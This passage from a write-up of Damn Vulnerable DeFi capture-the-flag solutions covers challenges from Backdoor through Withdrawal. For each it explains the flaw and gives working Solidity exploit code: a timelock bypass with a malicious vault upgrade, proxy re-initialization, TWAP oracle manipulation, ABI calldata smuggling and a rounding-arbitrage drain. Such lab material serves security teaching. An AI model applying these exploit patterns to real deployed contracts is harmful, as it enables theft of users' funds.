            address recoveryAddress,
            uint amountTokensDistributed
        ) payable {
            singletonCopy = _singletonCopy;
            walletFactory = _walletFactory;
            token = _token;
            walletRegistry = walletRegistryAddress;
            beneficiaries = _beneficiaries;
            recovery = recoveryAddress;
            AMOUNT_TOKENS_DISTRIBUTED = amountTokensDistributed;
        }
        
        function approveTokens(DamnValuableToken _token, address spender) external {
            _token.approve(spender, type(uint256).max);
        }
        
        function attack() public {
            for (uint i = 0; i < beneficiaries.length; i++) {
                address newOwner = beneficiaries[i];
                address[] memory owners = new address[](1);
                owners[0] = newOwner;
                
                bytes memory maliciousData = abi.encodeCall(
                    this.approveTokens,
                    (token, address(this))
                );
                
                bytes memory initializer = abi.encodeCall(
                    Safe.setup,
                    (
                        owners,
                        1,
                        address(this),
                        maliciousData,
                        address(0),
                        address(0),
                        0,
                        payable(address(0))
                    )
                );
                
                SafeProxy proxy = walletFactory.createProxyWithCallback(
                    address(singletonCopy),
                    initializer,
                    1,
                    walletRegistry
                );
                
                token.transferFrom(
                    address(proxy),
                    address(this),
                    token.balanceOf(address(proxy))
                );
            }
            token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(
            singletonCopy,
            walletFactory,
            token,
            walletRegistry,
            users,
            recovery,
            AMOUNT_TOKENS_DISTRIBUTED
        );
        attacker.attack();
    }

## 12. Climber   

### Challenge Overview   

There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).    
The owner of the vault is a timelock contract. It can withdraw a limited amount of tokens every 15 days.    
On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.    
On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later. 
You must rescue all tokens from the vault and deposit them into the designated recovery account.    

### Vulnerability Analysis  

The Climber challenge exposes a critical vulnerability in the execution flow of the ClimberTimelock contract. The timelock controls access to a secure vault with 10 million DVT tokens, and the vulnerability allows an attacker to bypass the timelock delay mechanism completely.
The core vulnerability lies in the execute() function within the ClimberTimelock contract:  

    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {

        // ... other validation ...

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length; ++i) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }

        if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }

        operations[id].executed = true;
    }   

This implementation is vulnerable because it executes all function calls before validating if the operation was properly scheduled and ready for execution. This "execute first, validate later" pattern creates a critical race condition where an attacker can manipulate the contract's state during execution to make the validation check pass.    

Attack flow:    

1. Construct a malicious operation that includes multiple function calls:   
    - Grant PROPOSER_ROLE to the attacker's contract    
    - Set the timelock delay to 0   
    - Transfer ownership of the vault to the attacker's contract    
    - Schedule this same operation through the attacker's contract  
2. Call the timelock's execute() function with these operations 
3. After gaining ownership of the vault, deploy a malicious implementation contract 
4. Upgrade the vault implementation using the UUPS pattern  
5. Call a custom function in the new implementation to drain all tokens 

### Solution    

    contract Attacker {
        
        ClimberVault vault;
        ClimberTimelock timelock;
        DamnValuableToken token;
        address recovery;
        address[] targets = new address[](4);
        uint256[] values = new uint256[](4);
        bytes[] dataElements = new bytes[](4);

        constructor(
            ClimberVault _vault,
            ClimberTimelock _timelock,
            DamnValuableToken _token,
            address _recovery
        ) {
            vault = _vault;
            timelock = _timelock;
            token = _token;
            recovery = _recovery;
        }

        function attack() external {
            
            address maliciousImpl = address(new MaliciousVault());

            bytes memory grantRoleData = abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            );

            bytes memory changeDelayData = abi.encodeWithSignature(
                "updateDelay(uint64)",
                uint64(0)
            );

            bytes memory transferOwnershipData = abi.encodeWithSignature(
                "transferOwnership(address)",
                address(this)
            );

            bytes memory scheduleData = abi.encodeWithSignature(
                "timelockSchedule()"
            );
        
            targets[0] = address(timelock);
            values[0] = 0;
            dataElements[0] = grantRoleData;

            targets[1] = address(timelock);
            values[1] = 0;
            dataElements[1] = changeDelayData;

            targets[2] = address(vault);
            values[2] = 0;
            dataElements[2] = transferOwnershipData;

            targets[3] = address(this);
            values[3] = 0;
            dataElements[3] = scheduleData;

            timelock.execute(
                targets,
                values,
                dataElements,
                bytes32(0)
            );

            vault.upgradeToAndCall(address(maliciousImpl), "");
            MaliciousVault(address(vault)).drainFunds(address(token), recovery);
        }

        function timelockSchedule() external {
            timelock.schedule(targets, values, dataElements, bytes32(0));
        }
    }

    contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
        uint256 private _lastWithdrawalTimestamp;
        address private _sweeper;

        /// @custom:oz-upgrades-unsafe-allow constructor
        constructor() {
            _disableInitializers();
        }

        function drainFunds(address token, address receiver) external {
            SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
        }

        function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(vault, timelock, token, recovery);
        attacker.attack();
    }

## 13. Wallet Mining

### Challenge Overview  

There’s a contract that incentivizes users to deploy Safe wallets, rewarding them with 1 DVT. It integrates with an upgradeable authorization mechanism, only allowing certain deployers (a.k.a. wards) to be paid for specific deployments.    
The deployer contract only works with a Safe factory and copy set during deployment. It looks like the [Safe singleton factory](https://github.com/safe-global/safe-singleton-factory) is already deployed. 
The team transferred 20 million DVT tokens to a user at `0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496`, where her plain 1-of-1 Safe was supposed to land. But they lost the nonce they should use for deployment. 
To make matters worse, there's been rumours of a vulnerability in the system. The team's freaked out. Nobody knows what to do, let alone the user. She granted you access to her private key.   
You must save all funds before it's too late!   
Recover all tokens from the wallet deployer contract and send them to the corresponding ward. Also save and return all user's funds.    
In a single transaction.    

### Vulnerability Analysis

The Wallet Mining challenge exposes a critical flaw in the upgrade mechanism of the AuthorizerUpgradeable contract. The vulnerability allows an attacker to re-initialize an already initialized proxy contract to bypass the authorization system.
The core vulnerability lies in the init() function within the AuthorizerUpgradeable contract:   

    contract AuthorizerUpgradeable {
        uint256 public needsInit = 1;
        mapping(address => mapping(address => uint256)) private wards;

        constructor() {
            needsInit = 0; // freeze implementation
        }

        function init(address[] memory _wards, address[] memory _aims) external {
            require(needsInit != 0, "cannot init");
            for (uint256 i = 0; i < _wards.length; i++) {
                _rely(_wards[i], _aims[i]);
            }
            needsInit = 0;
        }
        
        // ...
    }   

This implementation is vulnerable because of how proxy patterns work. When using a TransparentProxy, the constructor runs only on the implementation contract, not on the proxy. The needsInit = 0 in the constructor only affects the implementation, while the proxy's storage (which users interact with) remains uninitialized. While there is a check to prevent re-initialization (require(needsInit != 0)), this protection is ineffective because the AuthorizerFactory deploys a new implementation each time, allowing the attacker to call init() again and manipulate the authorization settings.   

Attack flow:    

1. Determine the correct nonce using CREATE2 address calculation to match the target address where 20M tokens are stored    
2. Create initialization data for a 1-of-1 Safe wallet with the user as the owner   
3. Pre-sign a transaction (using the user's private key) that will transfer all tokens to the user's EOA    
4. Re-initialize the AuthorizerUpgradeable contract to authorize the attacker to deploy to the target address   
5. Call the drop() function on WalletDeployer with the correct nonce to deploy the Safe wallet to the exact address holding the tokens  
6. Execute the pre-signed transaction to recover all 20M tokens to the user's address   
7. Transfer the 1 DVT reward from the WalletDeployer to the ward address    


### Solution

    contract Exploit {
        constructor (
            DamnValuableToken token,
            AuthorizerUpgradeable authorizer,
            WalletDeployer walletDeployer,
            address safe,
            address ward,
            bytes memory initializer,
            uint256 saltNonce,
            bytes memory txData
        ) {
            address[] memory wards = new address[](1);
            address[] memory aims = new address[](1);

            wards[0] = address(this);
            aims[0] = safe;

            authorizer.init(wards, aims);
            walletDeployer.drop(address(safe), initializer, saltNonce);
            token.transfer(ward, token.balanceOf(address(this)));
            safe.call(txData);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        // Step 1: Find the correct nonce and prepare data
        (uint256 nonce, bytes memory initializer) = findCorrectNonce();
        
        // Step 2: Get the transaction data for execution
        bytes memory execData = prepareExecTransactionData();
        
        // Step 3: Deploy the exploit contract
        new Exploit(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, nonce, execData);
    }

    // Helper function to find the correct nonce
    function findCorrectNonce() private returns (uint256 nonce, bytes memory initializer) {
        address[] memory owner = new address[](1);
        owner[0] = user;
        initializer = abi.encodeCall(Safe.setup, (owner, 1, address(0), "",
                                        address(0), address(0), 0, payable(0)));
        
        while(true) {
            address target = vm.computeCreate2Address(
                keccak256(abi.encodePacked(keccak256(initializer), nonce)),
                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
                address(proxyFactory)
            );
            if (target == USER_DEPOSIT_ADDRESS) {
                break;
            }
            nonce++;
        }
        
        return (nonce, initializer);
    }

    // Helper function to prepare the transaction data
    function prepareExecTransactionData() private returns (bytes memory) {
        bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
        
        // Calculate transaction hash
        bytes32 safeTxHash = keccak256(
            abi.encode(
                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH,
                address(token),
                0,
                keccak256(data),
                Enum.Operation.Call,
                100000,
                100000,
                0,
                address(0),
                address(0),
                0 // nonce of the Safe (first transaction)
            )
        );

        bytes32 domainSeparator = keccak256(abi.encode(
            0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH,
            singletonCopy.getChainId(),
            USER_DEPOSIT_ADDRESS
        ));

        // Sign the transaction
        bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        bytes memory signatures = abi.encodePacked(r, s, v);
        
        // Create execution data
        return abi.encodeWithSelector(
            singletonCopy.execTransaction.selector, 
            address(token), 
            0, 
            data, 
            Enum.Operation.Call, 
            100000, 
            100000, 
            0, 
            address(0), 
            address(0), 
            signatures
        );
    }   

## 14. Puppet V3

### Challenge Overview

Bear or bull market, true DeFi devs keep building. Remember that lending pool you helped? A new version is out. 
They’re now using Uniswap V3 as an oracle. That’s right, no longer using spot prices! This time the pool queries the time-weighted average price of the asset, with all the recommended libraries.  
The Uniswap market has 100 WETH and 100 DVT in liquidity. The lending pool has a million DVT tokens.    
Starting with 1 ETH and some DVT, you must save all from the vulnerable lending pool. Don't forget to send them to the designated recovery account. 
_NOTE: this challenge requires a valid RPC URL to fork mainnet state into your local environment._  

### Vulnerability Analysis

The Puppet V3 challenge exposes a price oracle manipulation vulnerability despite upgrading to Uniswap V3's time-weighted average price (TWAP) mechanism. The lending pool now uses Uniswap V3 and a time-based oracle, but critical vulnerabilities remain.
The core vulnerability lies in the _getOracleQuote() function within the PuppetV3Pool contract: 

    function _getOracleQuote(uint128 amount) private view returns (uint256) {
        (int24 arithmeticMeanTick,) = OracleLibrary.consult({
            pool: address(uniswapV3Pool), 
            secondsAgo: TWAP_PERIOD
        });
        return OracleLibrary.getQuoteAtTick({
            tick: arithmeticMeanTick,
            baseAmount: amount,
            baseToken: address(token),
            quoteToken: address(weth)
        });
    }   

This implementation is vulnerable for several reasons:  

1. Short TWAP period: The 10-minute (600 seconds) time window is insufficient for protection against manipulation   
2. Insufficient liquidity: The Uniswap V3 pool only has 100 WETH and 100 DVT    
3. Concentrated liquidity range: The pool's liquidity is concentrated in a narrow price range, explicitly defined in the setup:     

``` 
positionManager.mint(
    INonfungiblePositionManager.MintParams({
        token0: token0,
        token1: token1,
        tickLower: -60,
        tickUpper: 60,
        fee: FEE,
        recipient: deployer,
        amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
        amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp
    })
);
``` 
4. No circuit breakers: The oracle blindly trusts the Uniswap V3 TWAP without any validation or maximum price deviation checks  

Attack flow:    

1. Swap a large amount of DVT tokens (110 DVT) for WETH through Uniswap V3  
2. This pushes the price outside the concentrated liquidity range (ticks -60 to +60), causing a catastrophic price collapse to extreme negative tick values (-887272)   
3. Wait approximately 114 seconds to maximize the TWAP manipulation while staying within the time limit 
4. The manipulated TWAP makes DVT appear extremely devalued compared to WETH (99.995% price reduction)  
5. Convert ETH to WETH for collateral   
6. Calculate the now minimal required collateral (reduced from 3,000,000 WETH to just 0.143 WETH)   
7. Approve and deposit this minimal WETH as collateral  
8. Borrow the entire DVT balance (1,000,000 tokens) from the lending pool   
9. Transfer all tokens to the recovery address  

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV3() public checkSolvedByPlayer {
        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        uint256 wethRequiredBefore = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);

        token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token),
                tokenOut: address(weth),
                fee: FEE,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        vm.warp(block.timestamp + 114 seconds);
        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.deposit{value: player.balance}();
        weth.approve(address(lendingPool), wethRequired);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }


## 15. ABI Smuggling

### Challenge Overview

There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.  
The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.    
The dev team has received a responsible disclosure saying all funds can be stolen.  
Rescue all funds from the vault, transferring them to the designated recovery account.  

### Vulnerability Analysis

The ABI Smuggling challenge exposes a critical vulnerability in the authorization system of the SelfAuthorizedVault contract. Despite implementing a seemingly robust permission system, the contract fails to properly validate function calls, allowing an attacker to bypass restrictions and drain the vault.
The core vulnerability lies in the execute() function within the AuthorizedExecutor contract:   

    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

        _beforeFunctionCall(target, actionData);

        return target.functionCall(actionData);
    }   

The code assumes that the actionData always begins at position 100 (4 + 32 * 3), ignoring the fact that in ABI encoding, the actual location is determined by a dynamic offset. There is no validation of actionData integrity, as the code extracts what it thinks is the function selector without verifying it's examining the correct position. Most critically, the code checks permissions based on bytes at a fixed position but executes the entire actionData regardless of what the permission check actually examined, creating a permission check/execution mismatch.

Attack flow:    

1. Craft a malicious calldata payload with the following structure:  
    - First 4 bytes: Execute function selector  
    - Next 32 bytes: Target address (the vault) 
    - Next 32 bytes: Custom offset pointing to where our real actionData begins (0x80/128)  
    - Next 32 bytes: Empty padding data 
    - Next 32 bytes: Starting with the permitted function selector (0xd9caed12) at position 100 
    - Next 32 bytes: Length of the sweepFunds calldata  
    - Remaining bytes: The actual sweepFunds function call with parameters  

2. When the execute() function processes this payload:  
    - It checks position 100 and finds the permitted selector (0xd9caed12)  
    - The permission check passes since this matches an allowed function    
    - But when executing, it uses the provided offset (0x80) to find the real actionData    
    - This executes sweepFunds() instead of getLastWithdrawalTimestamp()    

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));

        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );

        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));

        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        address(vault).call(calldataPayload);
    }


## 16. Shards

### Challenge overview

The Shards NFT marketplace is a permissionless smart contract enabling holders of Damn Valuable NFTs to sell them at any price (expressed in USDC). 
These NFTs could be so damn valuable that sellers can offer them in smaller fractions ("shards"). Buyers can buy these shards, represented by an ERC1155 token. The marketplace only pays the seller once the whole NFT is sold.    
The marketplace charges sellers a 1% fee in Damn Valuable Tokens (DVT). These can be stored in a secure on-chain vault, which in turn integrates with a DVT staking system. 
Somebody is selling one NFT for... wow, a million USDC? 
You better dig into that marketplace before the degens find out.    
You start with no DVTs. Rescue as much funds as you can in a single transaction, and deposit the assets into the designated recovery account.   

### Vulnerability Analysis

The Shards challenge exposes a critical vulnerability in the mathematical calculations used for buying and canceling fractionalized NFTs. Despite implementing an intricate NFT marketplace with fractionalization features, the contract contains a severe rounding discrepancy that allows attackers to extract tokens from the system without any initial capital.
The core vulnerability lies in the inconsistent rounding methods used between the fill() and cancel() functions within the ShardsNFTMarketplace contract:   

    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {
        // ... other code ...
        paymentToken.transferFrom(
            msg.sender, 
            address(this), 
            want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
        );
        // ... more code ...
    }

    function cancel(uint64 offerId, uint256 purchaseIndex) external {
        // ... other code ...
        paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
    }   

This implementation is vulnerable due to a fundamental inconsistency in numerical precision handling. When buying shards, the contract uses mulDivDown which rounds the result down, potentially to zero for small purchases. Conversely, when canceling purchases, it uses mulDivUp which rounds up, ensuring even microscopic fractional amounts are rounded to at least 1 token. This creates a mathematical arbitrage opportunity.

Attack flow:

1. Purchase a small number of shards (under 134) for effectively 0 tokens due to downward rounding  
2. Cancel the same purchase and receive a positive number of tokens due to upward rounding  
3. Repeat this process  

### Solution

    contract Attacker {
        DamnValuableToken token;
        ShardsNFTMarketplace marketplace;
        address recovery;

        constructor(
            address _token,
            address _marketplace,
            address _recovery
        ) {
            token = DamnValuableToken(_token);
            marketplace = ShardsNFTMarketplace(_marketplace);
            recovery = _recovery;
        }

        function attack() public {
            for(uint256 i = 0; i <= 10000; i++) {
                marketplace.fill(1, 133);
                marketplace.cancel(1, i);
            }

            token.transfer(recovery, token.balanceOf(address(this)));
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_shards() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(address(token), address(marketplace), recovery);
        attacker.attack();
    }

## 17. Curvy Puppet 

## 18. Withdrawal

### Challenge Overview

There's a token bridge to withdraw Damn Valuable Tokens from an L2 to L1. It has a million DVT tokens in balance.   
The L1 side of the bridge allows anyone to finalize withdrawals, as long as the delay period has passed and they present a valid Merkle proof. The proof must correspond with the latest withdrawals' root set by the bridge owner. 
You were given the event logs of 4 withdrawals initiated on L2 in a JSON file. They could be executed on L1 after the 7 days delay. 
But there's one suspicious among them, isn't there? You may want to double-check, because all funds might be at risk. Luckily you are a bridge operator with special powers.    
Protect the bridge by finalizing _all_ given withdrawals, preventing the suspicious one from executing, and somehow not draining all funds. 

### Vulnerability Analysis  

The challenge exposes a critical threat where a potentially malicious user attempts to withdraw 990,000 tokens (99% of the bridge's balance) alongside legitimate transactions. The discovery comes from analyzing the withdrawal events where:

```
    // Third withdrawal (discovered to be malicious)
    {
        "topics": [...],
        "data": "0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015..."
    }
```

When decoded, this withdrawal reveals:  
    - Receiver: 0xea475d60c118d7058bef4bdd9c32ba51139a74e0  
    - Amount: 990,000 tokens (Unlike other withdrawals that request only 10 tokens each)    

Solution flow:    

1. Create a fabricated withdrawal message that transfers 990,000 tokens from the bridge to the player's address 
2. Use operator privilege to finalize this fake withdrawal without providing a Merkle proof, temporarily draining the bridge    
3. Move forward in time past the delay period for the legitimate withdrawals (7+ days)  
4. Process the first two legitimate 10-token withdrawals successfully   
5. Process the malicious third withdrawal (990,000 tokens), which fails during execution due to insufficient funds  
6. Process the fourth legitimate 10-token withdrawal successfully   
7. Return the 990,000 tokens to the bridge to satisfy the challenge requirements that most tokens remain in the bridge  
8. All withdrawals are now marked as finalized, including the malicious one which failed execution but was still marked as processed    

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {

        // Create a fabricated withdrawal that transfers 990,000 tokens to the player
        bytes memory message = abi.encodeCall(
            L1Forwarder.forwardMessage,
            (
                0, // nonce
                address(0), // l2Sender (empty address works here)  
                address(l1TokenBridge), // target
                abi.encodeCall( // encode the actual executeTokenWithdrawal call
                    TokenBridge.executeTokenWithdrawal,
                    (
                        player, // recipient of the withdrawal
                        990_000e18 // amount to withdraw - leaving 100k in bridge
                    )
                )
            )
        );

        // Use operator privilege to finalize the fake withdrawal without providing Merkle proof
        l1Gateway.finalizeWithdrawal(
            0, // nonce
            l2Handler, // impersonate l2Handler to pass authorization checks in TokenBridge 
            address(l1Forwarder), // target to process the forwarded message
            block.timestamp - 7 days, // old timestamp to pass the 7-day delay requirement
            message, 
            new bytes32[](0) // empty proof array since we're using operator privilege  
        );

        // Move time forward past the delay period for the legitimate withdrawals
        vm.warp(1718786915 + 8 days);
        
        // Finalize the first legitimate withdrawal (10 tokens)
        l1Gateway.finalizeWithdrawal(
            0, // nonce
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786915, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
            new bytes32[](0) // no proof needed as operator
        );

        // Finalize the second legitimate withdrawal (10 tokens)
        l1Gateway.finalizeWithdrawal(
            1, // nonce
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786965, // timestamp
            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
            new bytes32[](0) // no proof needed as operator
        );

        // Finalize the malicious third withdrawal (990,000 tokens)
        // This will fail during execution due to insufficient funds (only 70,000 left after two 10-token withdrawals)
        // But it will still be marked as finalized in the gateway
        l1Gateway.finalizeWithdrawal(
            2, // nonce
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787050, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // encoded message data
            new bytes32[](0) // no proof needed as operator
        );

        // Finalize the fourth legitimate withdrawal (10 tokens)
        l1Gateway.finalizeWithdrawal(
            3, // nonce
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787127, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
            new bytes32[](0) // no proof needed as operator
        );
 
        // Return the borrowed tokens to the bridge
        token.transfer(address(l1TokenBridge),990_000e18);
    }